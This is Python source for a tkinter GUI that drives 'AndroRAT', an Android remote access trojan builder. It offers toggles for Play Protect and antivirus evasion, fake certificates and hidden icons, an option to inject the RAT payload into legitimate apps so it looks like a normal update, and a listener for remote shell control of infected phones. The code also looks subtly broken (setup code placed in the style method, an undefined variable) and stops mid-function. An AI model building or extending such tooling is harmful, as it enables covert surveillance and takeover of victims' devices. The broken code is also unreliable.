#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT GUI Application
A graphical user interface for the AndroRAT tool.
Provides an easy-to-use interface for building APKs and managing connections.
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
import queue
import sys
import os
import platform
import subprocess
from utils import *

class AndroRATGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AndroRAT - Android Remote Administration Tool")
        self.root.geometry("900x700")
        self.root.minsize(800, 600)
        
        # Configure modern theme and styles
        self.setup_modern_styles()
        
        # Configure dark theme colors
        self.colors = {
            'bg_primary': '#1e1e1e',
            'bg_secondary': '#2d2d2d', 
            'bg_tertiary': '#3d3d3d',
            'accent': '#007acc',
            'accent_hover': '#005a9e',
            'success': '#28a745',
            'warning': '#ffc107',
            'danger': '#dc3545',
            'text_primary': '#ffffff',
            'text_secondary': '#cccccc',
            'border': '#555555'
        }
        
        # Apply dark theme
        self.root.configure(bg=self.colors['bg_primary'])
        
    def setup_modern_styles(self):
        """Configure modern Material Design-inspired styles"""
        style = ttk.Style()
        
        # Use a modern theme as base
        available_themes = style.theme_names()
        if 'vista' in available_themes:
            style.theme_use('vista')
        elif 'clam' in available_themes:
            style.theme_use('clam')
        elif 'alt' in available_themes:
            style.theme_use('alt')
            
        # Configure custom styles for modern look
        style.configure('Modern.TFrame', background='#2d2d2d', relief='flat')
        style.configure('Card.TFrame', background='#3d3d3d', relief='raised', borderwidth=1)
        style.configure('Header.TLabel', background='#2d2d2d', foreground='#ffffff', 
                       font=('Segoe UI', 16, 'bold'))
        style.configure('Subtitle.TLabel', background='#2d2d2d', foreground='#cccccc',
                       font=('Segoe UI', 10))
        style.configure('Accent.TButton', focuscolor='#007acc')
        style.map('Accent.TButton',
                 background=[('active', '#005a9e'), ('pressed', '#004080')])
        
        # Modern notebook style
        style.configure('Modern.TNotebook', background='#1e1e1e', borderwidth=0)
        style.configure('Modern.TNotebook.Tab', padding=[20, 10], 
                       font=('Segoe UI', 10, 'bold'))
        
        # Modern labelframe
        style.configure('Modern.TLabelframe', background='#2d2d2d', 
                       foreground='#ffffff', relief='flat', borderwidth=2)
        style.configure('Modern.TLabelframe.Label', background='#2d2d2d',
                       foreground='#007acc', font=('Segoe UI', 11, 'bold'))
        
        # Modern entry and combobox
        style.configure('Modern.TEntry', relief='flat', borderwidth=1, 
                       font=('Segoe UI', 10))
        style.configure('Modern.TCombobox', relief='flat', borderwidth=1,
                       font=('Segoe UI', 10))
        
        # Message queue for thread communication
        self.message_queue = queue.Queue()
        
        # Variables
        self.ip_var = tk.StringVar()
        self.port_var = tk.StringVar(value="8000")
        self.output_var = tk.StringVar(value="karma.apk")
        self.icon_var = tk.BooleanVar()
        self.ngrok_var = tk.BooleanVar()
        self.tunnel_var = tk.BooleanVar()
        self.tunnel_service_var = tk.StringVar(value="auto")
        
        # Advanced evasion variables
        self.stealth_var = tk.BooleanVar()
        self.anti_analysis_var = tk.BooleanVar()
        self.play_protect_var = tk.BooleanVar()
        self.advanced_obfuscation_var = tk.BooleanVar()
        self.fake_certificates_var = tk.BooleanVar()
        self.random_package_var = tk.BooleanVar()
        
        # APK injection variables
        self.inject_var = tk.BooleanVar()
        self.target_apk_var = tk.StringVar()
        
        # Create modern notebook for tabs
        self.notebook = ttk.Notebook(root, style='Modern.TNotebook')
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.create_build_tab()
        self.create_shell_tab()
        self.create_purge_tab()  # New purge tab
        self.create_log_tab()
        
        # Modern status bar
        self.status_var = tk.StringVar(value="🟢 Ready")
        self.status_bar = tk.Label(root, textvariable=self.status_var, 
                                  bg=self.colors['bg_secondary'], 
                                  fg=self.colors['text_primary'],
                                  relief=tk.RAISED, borderwidth=1,
                                  font=('Segoe UI', 9))
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Start message processing
        self.process_queue()
        
    def create_build_tab(self):
        """Create the APK building tab with modern design"""
        build_frame = ttk.Frame(self.notebook, style='Modern.TFrame')
        self.notebook.add(build_frame, text="🏗️ Build APK")
        
        # Modern header with gradient-like appearance
        header_frame = tk.Frame(build_frame, bg=self.colors['bg_primary'], height=80)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        # Title with modern typography
        title_label = tk.Label(header_frame, text="🚀 AndroRAT APK Builder", 
                              bg=self.colors['bg_primary'], fg=self.colors['text_primary'],
                              font=('Segoe UI', 20, 'bold'))
        title_label.pack(pady=(15, 5))
        
        subtitle_label = tk.Label(header_frame, 
                                 text="Configure and build your Android RAT APK with advanced evasion",
                                 bg=self.colors['bg_primary'], fg=self.colors['text_secondary'],
                                 font=('Segoe UI', 11))
        subtitle_label.pack()
        
        # Scrollable content frame
        self.build_canvas = tk.Canvas(build_frame, bg=self.colors['bg_primary'], highlightthickness=0)
        self.build_scrollbar = ttk.Scrollbar(build_frame, orient="vertical", command=self.build_canvas.yview)
        self.build_scrollable_frame = tk.Frame(self.build_canvas, bg=self.colors['bg_primary'])
        
        self.build_scrollable_frame.bind(
            "<Configure>",
            lambda e: self.build_canvas.configure(scrollregion=self.build_canvas.bbox("all"))
        )
        
        self.build_canvas.create_window((0, 0), window=self.build_scrollable_frame, anchor="nw")
        self.build_canvas.configure(yscrollcommand=self.build_scrollbar.set)
        
        self.build_canvas.pack(side="left", fill="both", expand=True)
        self.build_scrollbar.pack(side="right", fill="y")
        
        # Modern configuration cards
        self.create_connection_card()
        self.create_evasion_card()
        self.create_injection_card()
        self.create_build_controls_card()
        
    def create_connection_card(self):
        """Create modern connection settings card"""
        card_frame = tk.Frame(self.build_scrollable_frame, bg=self.colors['bg_secondary'], 
                             relief='raised', borderwidth=1)
        card_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # Card header
        header = tk.Frame(card_frame, bg=self.colors['accent'], height=40)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        tk.Label(header, text="🌐 Connection Settings", 
                bg=self.colors['accent'], fg='white',
                font=('Segoe UI', 12, 'bold')).pack(pady=12)
        
        # Card content
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill=tk.X, padx=20, pady=15)
        
        # Tunneling section with modern styling
        tunnel_section = tk.Frame(content, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
        tunnel_section.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(tunnel_section, text="🚇 Tunneling Options", 
                bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 11, 'bold')).pack(pady=(10, 5))
        
        # Modern checkboxes with better styling
        tunnel_checks = tk.Frame(tunnel_section, bg=self.colors['bg_tertiary'])
        tunnel_checks.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        self.tunnel_check = tk.Checkbutton(tunnel_checks, text="🔄 Auto-select best tunneling service", 
                                          variable=self.tunnel_var, command=self.on_tunnel_toggle,
                                          bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                          font=('Segoe UI', 10), selectcolor=self.colors['bg_secondary'],
                                          activebackground=self.colors['bg_tertiary'])
        self.tunnel_check.pack(anchor=tk.W, pady=2)
        
        # Service selection with modern combobox
        service_frame = tk.Frame(tunnel_checks, bg=self.colors['bg_tertiary'])
        service_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(service_frame, text="Preferred Service:", 
                bg=self.colors['bg_tertiary'], fg=self.colors['text_secondary'],
                font=('Segoe UI', 10)).pack(side=tk.LEFT)
        
        self.service_combo = ttk.Combobox(service_frame, textvariable=self.tunnel_service_var,
                                         values=["auto", "cloudflared", "serveo", "localtunnel", "ngrok"],
                                         state="readonly", width=15, style='Modern.TCombobox')
        self.service_combo.pack(side=tk.LEFT, padx=(10, 0))
        
        # Info labels with modern icons
        info_frame = tk.Frame(tunnel_checks, bg=self.colors['bg_tertiary'])
        info_frame.pack(fill=tk.X, pady=5)
        
        self.tunnel_info = tk.Label(info_frame, 
                                   text="✅ Recommended: Avoids ngrok credit card requirement",
                                   bg=self.colors['bg_tertiary'], fg=self.colors['success'],
                                   font=('Segoe UI', 9))
        self.tunnel_info.pack(anchor=tk.W)
        
        # Legacy ngrok with warning
        ngrok_frame = tk.Frame(tunnel_checks, bg=self.colors['bg_tertiary'])
        ngrok_frame.pack(fill=tk.X, pady=5)
        
        self.ngrok_check = tk.Checkbutton(ngrok_frame, text="🔴 Use legacy ngrok (requires credit card)", 
                                         variable=self.ngrok_var, command=self.on_ngrok_toggle,
                                         bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                         font=('Segoe UI', 10), selectcolor=self.colors['bg_secondary'],
                                         activebackground=self.colors['bg_tertiary'])
        self.ngrok_check.pack(side=tk.LEFT)
        
        self.ngrok_warning = tk.Label(ngrok_frame, text="⚠️ May require credit card", 
                                     bg=self.colors['bg_tertiary'], fg=self.colors['warning'],
                                     font=('Segoe UI', 8))
        self.ngrok_warning.pack(side=tk.LEFT, padx=(10, 0))
        
        # IP and Port with modern entries
        ip_section = tk.Frame(content, bg=self.colors['bg_secondary'])
        ip_section.pack(fill=tk.X, pady=5)
        
        ip_frame = tk.Frame(ip_section, bg=self.colors['bg_secondary'])
        ip_frame.pack(fill=tk.X)
        
        tk.Label(ip_frame, text="🌍 IP Address:", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT)
        
        self.ip_entry = tk.Entry(ip_frame, textvariable=self.ip_var, width=20,
                                bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                font=('Segoe UI', 10), relief='flat', borderwidth=2)
        self.ip_entry.pack(side=tk.LEFT, padx=(10, 20))
        
        tk.Label(ip_frame, text="🔌 Port:", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT)
        
        self.port_entry = tk.Entry(ip_frame, textvariable=self.port_var, width=10,
                                  bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                  font=('Segoe UI', 10), relief='flat', borderwidth=2)
        self.port_entry.pack(side=tk.LEFT, padx=(10, 0))
        
        # Output settings
        output_section = tk.Frame(content, bg=self.colors['bg_secondary'])
        output_section.pack(fill=tk.X, pady=(15, 0))
        
        tk.Label(output_section, text="📁 Output Settings", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 11, 'bold')).pack(anchor=tk.W, pady=(0, 5))
        
        output_controls = tk.Frame(output_section, bg=self.colors['bg_secondary'])
        output_controls.pack(fill=tk.X)
        
        tk.Label(output_controls, text="APK Name:", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_secondary'],
                font=('Segoe UI', 10)).pack(side=tk.LEFT)
        
        self.output_entry = tk.Entry(output_controls, textvariable=self.output_var, width=25,
                                    bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                    font=('Segoe UI', 10), relief='flat', borderwidth=2)
        self.output_entry.pack(side=tk.LEFT, padx=(10, 10))
        
        browse_btn = tk.Button(output_controls, text="📁 Browse", 
                              command=self.browse_output_file,
                              bg=self.colors['accent'], fg='white',
                              font=('Segoe UI', 10), relief='flat',
                              activebackground=self.colors['accent_hover'])
        browse_btn.pack(side=tk.LEFT)
        
        # Icon option
        icon_frame = tk.Frame(output_section, bg=self.colors['bg_secondary'])
        icon_frame.pack(fill=tk.X, pady=(10, 0))
        
        self.icon_check = tk.Checkbutton(icon_frame, text="👁️ Visible icon after installation", 
                                        variable=self.icon_var,
                                        bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                                        font=('Segoe UI', 10), selectcolor=self.colors['bg_tertiary'],
                                        activebackground=self.colors['bg_secondary'])
        self.icon_check.pack(anchor=tk.W)
        
    def create_evasion_card(self):
        """Create modern evasion options card"""
        card_frame = tk.Frame(self.build_scrollable_frame, bg=self.colors['bg_secondary'], 
                             relief='raised', borderwidth=1)
        card_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # Card header with gradient-like appearance
        header = tk.Frame(card_frame, bg=self.colors['warning'], height=40)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        tk.Label(header, text="🛡️ Advanced Evasion Options", 
                bg=self.colors['warning'], fg='black',
                font=('Segoe UI', 12, 'bold')).pack(pady=12)
        
        # Card content
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill=tk.X, padx=20, pady=15)
        
        # Evasion grid with modern design
        evasion_grid = tk.Frame(content, bg=self.colors['bg_secondary'])
        evasion_grid.pack(fill=tk.X)
        
        # Left column
        left_col = tk.Frame(evasion_grid, bg=self.colors['bg_secondary'])
        left_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        evasion_options_left = [
            ("🛡️ Maximum Stealth Mode", self.stealth_var, "Hide from all detection systems"),
            ("🔍 Anti-Analysis & Sandbox Evasion", self.anti_analysis_var, "Bypass security analysis"),
            ("🛡️ Play Protect Evasion", self.play_protect_var, "Evade Google Play Protect")
        ]
        
        for text, var, tooltip in evasion_options_left:
            option_frame = tk.Frame(left_col, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
            option_frame.pack(fill=tk.X, pady=3)
            
            check = tk.Checkbutton(option_frame, text=text, variable=var,
                                  bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                  font=('Segoe UI', 10), selectcolor=self.colors['bg_secondary'],
                                  activebackground=self.colors['bg_tertiary'])
            check.pack(anchor=tk.W, padx=10, pady=8)
            
            tip_label = tk.Label(option_frame, text=f"💡 {tooltip}",
                               bg=self.colors['bg_tertiary'], fg=self.colors['text_secondary'],
                               font=('Segoe UI', 8))
            tip_label.pack(anchor=tk.W, padx=25, pady=(0, 8))
        
        # Right column
        right_col = tk.Frame(evasion_grid, bg=self.colors['bg_secondary'])
        right_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0))
        
        evasion_options_right = [
            ("🔐 Advanced String Obfuscation", self.advanced_obfuscation_var, "Encrypt strings and code"),
            ("📜 Fake Certificate Metadata", self.fake_certificates_var, "Mimic trusted certificates"),
            ("📦 Random Package Name", self.random_package_var, "Generate random identifiers")
        ]
        
        for text, var, tooltip in evasion_options_right:
            option_frame = tk.Frame(right_col, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
            option_frame.pack(fill=tk.X, pady=3)
            
            check = tk.Checkbutton(option_frame, text=text, variable=var,
                                  bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                  font=('Segoe UI', 10), selectcolor=self.colors['bg_secondary'],
                                  activebackground=self.colors['bg_tertiary'])
            check.pack(anchor=tk.W, padx=10, pady=8)
            
            tip_label = tk.Label(option_frame, text=f"💡 {tooltip}",
                               bg=self.colors['bg_tertiary'], fg=self.colors['text_secondary'],
                               font=('Segoe UI', 8))
            tip_label.pack(anchor=tk.W, padx=25, pady=(0, 8))
        
        # Evasion info with modern styling
        info_frame = tk.Frame(content, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
        info_frame.pack(fill=tk.X, pady=(15, 0))
        
        info_label = tk.Label(info_frame, 
                             text="💡 These options help bypass Android security and antivirus detection",
                             bg=self.colors['bg_tertiary'], fg=self.colors['accent'],
                             font=('Segoe UI', 10, 'bold'))
        info_label.pack(pady=10)
        
    def create_injection_card(self):
        """Create modern APK injection card"""
        card_frame = tk.Frame(self.build_scrollable_frame, bg=self.colors['bg_secondary'], 
                             relief='raised', borderwidth=1)
        card_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # Card header
        header = tk.Frame(card_frame, bg=self.colors['danger'], height=40)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        tk.Label(header, text="💉 APK Injection Mode", 
                bg=self.colors['danger'], fg='white',
                font=('Segoe UI', 12, 'bold')).pack(pady=12)
        
        # Card content
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill=tk.X, padx=20, pady=15)
        
        # Injection toggle with modern design
        inject_toggle_frame = tk.Frame(content, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
        inject_toggle_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.inject_check = tk.Checkbutton(inject_toggle_frame, 
                                          text="💉 Inject into existing APK (preserves original functionality)", 
                                          variable=self.inject_var, command=self.on_inject_toggle,
                                          bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                          font=('Segoe UI', 11, 'bold'), selectcolor=self.colors['bg_secondary'],
                                          activebackground=self.colors['bg_tertiary'])
        self.inject_check.pack(anchor=tk.W, padx=15, pady=12)
        
        # Target APK selection (initially hidden)
        self.target_frame = tk.Frame(content, bg=self.colors['bg_secondary'])
        
        target_label = tk.Label(self.target_frame, text="🎯 Target APK:", 
                               bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                               font=('Segoe UI', 10, 'bold'))
        target_label.pack(side=tk.LEFT)
        
        self.target_entry = tk.Entry(self.target_frame, textvariable=self.target_apk_var, width=40,
                                    bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                    font=('Segoe UI', 10), relief='flat', borderwidth=2,
                                    state='disabled')
        self.target_entry.pack(side=tk.LEFT, padx=(10, 10))
        
        target_browse_btn = tk.Button(self.target_frame, text="📁 Browse APK", 
                                     command=self.browse_target_apk,
                                     bg=self.colors['accent'], fg='white',
                                     font=('Segoe UI', 10), relief='flat',
                                     activebackground=self.colors['accent_hover'])
        target_browse_btn.pack(side=tk.LEFT)
        
        # Info section
        info_frame = tk.Frame(content, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
        info_frame.pack(fill=tk.X, pady=(10, 0))
        
        info_text = ("💡 Injects RAT payload into legitimate apps while preserving their functionality\n"
                    "✅ Original app works exactly as before\n"
                    "🔒 Maximum stealth - appears as normal app update")
        
        info_label = tk.Label(info_frame, text=info_text,
                             bg=self.colors['bg_tertiary'], fg=self.colors['success'],
                             font=('Segoe UI', 9), justify=tk.LEFT)
        info_label.pack(anchor=tk.W, padx=15, pady=10)
        
    def create_build_controls_card(self):
        """Create modern build controls card"""
        card_frame = tk.Frame(self.build_scrollable_frame, bg=self.colors['bg_secondary'], 
                             relief='raised', borderwidth=1)
        card_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # Card header
        header = tk.Frame(card_frame, bg=self.colors['success'], height=40)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        tk.Label(header, text="🚀 Build Controls", 
                bg=self.colors['success'], fg='white',
                font=('Segoe UI', 12, 'bold')).pack(pady=12)
        
        # Card content
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill=tk.X, padx=20, pady=15)
        
        # Button frame with modern design
        button_frame = tk.Frame(content, bg=self.colors['bg_secondary'])
        button_frame.pack(fill=tk.X)
        
        # Modern build button
        self.build_button = tk.Button(button_frame, text="🚀 Build APK", 
                                     command=self.start_build,
                                     bg=self.colors['success'], fg='white',
                                     font=('Segoe UI', 12, 'bold'), relief='flat',
                                     activebackground='#1e7e34', height=2, width=15)
        self.build_button.pack(side=tk.LEFT, padx=(0, 15))
        
        # Secondary buttons
        clear_btn = tk.Button(button_frame, text="🗑️ Clear Log", 
                             command=self.clear_log,
                             bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                             font=('Segoe UI', 10), relief='flat',
                             activebackground=self.colors['border'])
        clear_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        # Modern progress bar
        self.progress_var = tk.DoubleVar()
        progress_frame = tk.Frame(content, bg=self.colors['bg_secondary'])
        progress_frame.pack(fill=tk.X, pady=(15, 0))
        
        tk.Label(progress_frame, text="📊 Build Progress:", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 10, 'bold')).pack(anchor=tk.W)
        
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, 
                                           mode='indeterminate', style='Modern.Horizontal.TProgressbar')
        self.progress_bar.pack(fill=tk.X, pady=(5, 0))
        
    def create_shell_tab(self):
        """Create the shell connection tab with modern design"""
        shell_frame = ttk.Frame(self.notebook, style='Modern.TFrame')
        self.notebook.add(shell_frame, text="🖥️ Shell Connection")
        
        # Modern header
        header_frame = tk.Frame(shell_frame, bg=self.colors['success'], height=80)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(header_frame, text="🖥️ Device Shell Interface", 
                              bg=self.colors['success'], fg='white',
                              font=('Segoe UI', 20, 'bold'))
        title_label.pack(pady=(15, 5))
        
        subtitle_label = tk.Label(header_frame, 
                                 text="Connect to and control Android devices remotely",
                                 bg=self.colors['success'], fg='white',
                                 font=('Segoe UI', 11))
        subtitle_label.pack()
        
        # Content frame
        content_frame = tk.Frame(shell_frame, bg=self.colors['bg_primary'])
        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Connection settings card
        conn_card = tk.Frame(content_frame, bg=self.colors['bg_secondary'], 
                            relief='raised', borderwidth=1)
        conn_card.pack(fill=tk.X, pady=(0, 15))
        
        conn_header = tk.Frame(conn_card, bg=self.colors['accent'], height=35)
        conn_header.pack(fill=tk.X)
        conn_header.pack_propagate(False)
        
        tk.Label(conn_header, text="⚙️ Connection Settings", 
                bg=self.colors['accent'], fg='white',
                font=('Segoe UI', 11, 'bold')).pack(pady=10)
        
        conn_content = tk.Frame(conn_card, bg=self.colors['bg_secondary'])
        conn_content.pack(fill=tk.X, padx=20, pady=15)
        
        # Connection controls with modern styling
        controls_frame = tk.Frame(conn_content, bg=self.colors['bg_secondary'])
        controls_frame.pack(fill=tk.X)
        
        tk.Label(controls_frame, text="🌍 Listen IP:", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT)
        
        self.shell_ip_var = tk.StringVar(value="0.0.0.0")
        shell_ip_entry = tk.Entry(controls_frame, textvariable=self.shell_ip_var, width=15,
                                 bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                 font=('Segoe UI', 10), relief='flat', borderwidth=2)
        shell_ip_entry.pack(side=tk.LEFT, padx=(10, 20))
        
        tk.Label(controls_frame, text="🔌 Port:", 
                bg=self.colors['bg_secondary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT)
        
        self.shell_port_var = tk.StringVar(value="8000")
        shell_port_entry = tk.Entry(controls_frame, textvariable=self.shell_port_var, width=10,
                                   bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                                   font=('Segoe UI', 10), relief='flat', borderwidth=2)
        shell_port_entry.pack(side=tk.LEFT, padx=(10, 20))
        
        self.shell_button = tk.Button(controls_frame, text="🚀 Start Listener", 
                                     command=self.start_shell,
                                     bg=self.colors['success'], fg='white',
                                     font=('Segoe UI', 10, 'bold'), relief='flat',
                                     activebackground='#1e7e34')
        self.shell_button.pack(side=tk.LEFT, padx=(20, 0))
        
        # Shell interface card
        shell_card = tk.Frame(content_frame, bg=self.colors['bg_secondary'], 
                             relief='raised', borderwidth=1)
        shell_card.pack(fill=tk.BOTH, expand=True)
        
        shell_header = tk.Frame(shell_card, bg=self.colors['bg_tertiary'], height=35)
        shell_header.pack(fill=tk.X)
        shell_header.pack_propagate(False)
        
        tk.Label(shell_header, text="💻 Shell Interface", 
                bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 11, 'bold')).pack(pady=10)
        
        shell_content = tk.Frame(shell_card, bg=self.colors['bg_secondary'])
        shell_content.pack(fill=tk.BOTH, expand=True, padx=20, pady=15)
        
        # Info section with modern styling
        info_frame = tk.Frame(shell_content, bg=self.colors['bg_tertiary'], relief='solid', borderwidth=1)
        info_frame.pack(fill=tk.BOTH, expand=True)
        
        info_text = ("💡 Shell interface will be available after starting the listener\n\n"
                    "🖥️ For full shell functionality, use CLI mode:\n"
                    "   python3 androRAT.py --shell -i 0.0.0.0 -p 8000\n\n"
                    "🔗 Connect your Android device to the displayed IP and port\n"
                    "⚡ Real-time command execution and file transfer capabilities")
        
        info_label = tk.Label(info_frame, text=info_text,
                             bg=self.colors['bg_tertiary'], fg=self.colors['text_secondary'],
                             font=('Segoe UI', 10), justify=tk.LEFT)
        info_label.pack(expand=True, padx=20, pady=20)
        
    def create_log_tab(self):
        """Create the log viewing tab with modern design"""
        log_frame = ttk.Frame(self.notebook, style='Modern.TFrame')
        self.notebook.add(log_frame, text="📋 Activity Logs")
        
        # Modern header
        header_frame = tk.Frame(log_frame, bg=self.colors['accent'], height=80)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(header_frame, text="📋 Activity Logs", 
                              bg=self.colors['accent'], fg='white',
                              font=('Segoe UI', 20, 'bold'))
        title_label.pack(pady=(15, 5))
        
        subtitle_label = tk.Label(header_frame, 
                                 text="Monitor all system activities and operations in real-time",
                                 bg=self.colors['accent'], fg='white',
                                 font=('Segoe UI', 11))
        subtitle_label.pack()
        
        # Content frame
        content_frame = tk.Frame(log_frame, bg=self.colors['bg_primary'])
        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Log controls card
        controls_card = tk.Frame(content_frame, bg=self.colors['bg_secondary'], 
                                relief='raised', borderwidth=1)
        controls_card.pack(fill=tk.X, pady=(0, 15))
        
        controls_header = tk.Frame(controls_card, bg=self.colors['bg_tertiary'], height=35)
        controls_header.pack(fill=tk.X)
        controls_header.pack_propagate(False)
        
        tk.Label(controls_header, text="🎛️ Log Controls", 
                bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 11, 'bold')).pack(pady=10)
        
        controls_content = tk.Frame(controls_card, bg=self.colors['bg_secondary'])
        controls_content.pack(fill=tk.X, padx=20, pady=15)
        
        # Modern control buttons
        clear_btn = tk.Button(controls_content, text="🗑️ Clear Logs", 
                             command=self.clear_log,
                             bg=self.colors['warning'], fg='black',
                             font=('Segoe UI', 10), relief='flat',
                             activebackground='#e0a800')
        clear_btn.pack(side=tk.LEFT, padx=(0, 15))
        
        save_btn = tk.Button(controls_content, text="💾 Save Logs", 
                            command=self.save_logs,
                            bg=self.colors['success'], fg='white',
                            font=('Segoe UI', 10), relief='flat',
                            activebackground='#1e7e34')
        save_btn.pack(side=tk.LEFT)
        
        # Log display card
        log_card = tk.Frame(content_frame, bg=self.colors['bg_secondary'], 
                           relief='raised', borderwidth=1)
        log_card.pack(fill=tk.BOTH, expand=True)
        
        log_header = tk.Frame(log_card, bg=self.colors['bg_tertiary'], height=35)
        log_header.pack(fill=tk.X)
        log_header.pack_propagate(False)
        
        tk.Label(log_header, text="📜 System Logs", 
                bg=self.colors['bg_tertiary'], fg=self.colors['text_primary'],
                font=('Segoe UI', 11, 'bold')).pack(pady=10)
        
        log_content = tk.Frame(log_card, bg=self.colors['bg_secondary'])
        log_content.pack(fill=tk.BOTH, expand=True, padx=20, pady=15)
        
        # Modern log text area
        self.log_text = scrolledtext.ScrolledText(log_content, height=20, wrap=tk.WORD,
                                                 bg=self.colors['bg_primary'], fg=self.colors['text_primary'],
                                                 font=('Consolas', 9), relief='flat', borderwidth=0,
                                                 insertbackground=self.colors['text_primary'])
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Add initial log messages with modern formatting
        self.add_log("🚀 AndroRAT Modern GUI started successfully")
        self.add_log("🎨 Modern UI theme loaded")
        self.add_log("💡 Ready to build APKs and manage connections")
        self.add_log("🗑️ Remote purge functionality enabled")
        
    def on_ngrok_toggle(self):
        """Handle ngrok checkbox toggle"""
        if self.ngrok_var.get():
            self.ip_entry.config(state='disabled')
            self.ip_var.set("(auto-configured by ngrok)")
            # Disable tunneling if ngrok is selected
            self.tunnel_var.set(False)
            self.on_tunnel_toggle()
        else:
            self.ip_entry.config(state='normal')
            self.ip_var.set("")
            
    def on_tunnel_toggle(self):
        """Handle auto-tunnel checkbox toggle"""
        if self.tunnel_var.get():
            self.ip_entry.config(state='disabled')
            self.ip_var.set("(auto-configured by tunnel)")
            # Disable ngrok if tunneling is selected
            self.ngrok_var.set(False)
            self.on_ngrok_toggle()
        else:
            if not self.ngrok_var.get():
                self.ip_entry.config(state='normal')
                self.ip_var.set("")
            
    def browse_output_file(self):
        """Browse for output APK file location"""
        filename = filedialog.asksaveasfilename(
            title="Save APK as...",
            defaultextension=".apk",
            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
        )
        if filename:
            self.output_var.set(os.path.basename(filename))
    
    def on_inject_toggle(self):
        """Handle APK injection checkbox toggle"""
        if self.inject_var.get():
            self.target_frame.pack(fill=tk.X, pady=5)
            self.target_entry.config(state='normal')
            self.add_log("APK injection mode enabled")
        else:
            self.target_frame.pack_forget()
            self.target_entry.config(state='disabled')
            self.target_apk_var.set("")
            self.add_log("APK injection mode disabled")
    
    def browse_target_apk(self):
        """Browse for target APK file"""
        filename = filedialog.askopenfilename(
            title="Select target APK to inject into...",
            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
        )
        if filename:
            self.target_apk_var.set(filename)
            self.add_log(f"Target APK selected: {os.path.basename(filename)}")
            
    def get_evasion_options(self):
        """Get current evasion options as dictionary"""
        return {
            'stealth': self.stealth_var.get(),
            'random_package': self.random_package_var.get(),
            'anti_analysis': self.anti_analysis_var.get(),
            'play_protect_evasion': self.play_protect_var.get(),
            'advanced_obfuscation': self.advanced_obfuscation_var.get(),
            'fake_certificates': self.fake_certificates_var.get()
        }
            
    def add_log(self, message, level="INFO"):
        """Add a message to the log"""
        import datetime
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_message = f"[{timestamp}] {level}: {message}\n"
        
